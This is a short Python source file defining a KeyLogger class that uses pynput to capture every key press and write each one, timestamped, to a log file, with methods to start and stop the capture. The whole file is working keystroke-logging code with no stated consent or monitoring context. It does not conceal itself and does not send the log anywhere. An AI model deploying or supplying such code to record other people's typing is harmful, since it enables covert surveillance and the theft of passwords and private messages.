from pynput.keyboard import Key, Listener
import logging


def _keypress_callback(key: Key) -> None:
    """
    Callback function for each keypress

    :param key: Key pressed
    """
    logging.info(str(key))


class KeyLogger:
    """
    Logs key presses to a file
    """

    def __init__(self, keylog_filename: str) -> None:
        """
        Constructor

        :param keylog_filename: The name of the file to store the key logs
        """

        self.keylog_filename = keylog_filename

        # Init listener
        self.listener = Listener(on_press=_keypress_callback)

    def start_log(self) -> None:
        """
        Starts logging key presses
        """

        # Initialize listener
        self.listener = Listener(on_press=_keypress_callback)

        # logging config
        logging.disable(logging.NOTSET)
        logging.basicConfig(filename=self.keylog_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        self.listener.start()

    def end_log(self) -> None:
        """
        Stops logging key pressed
        """
        # Disable logging calls
        logging.shutdown()

        self.listener.stop()
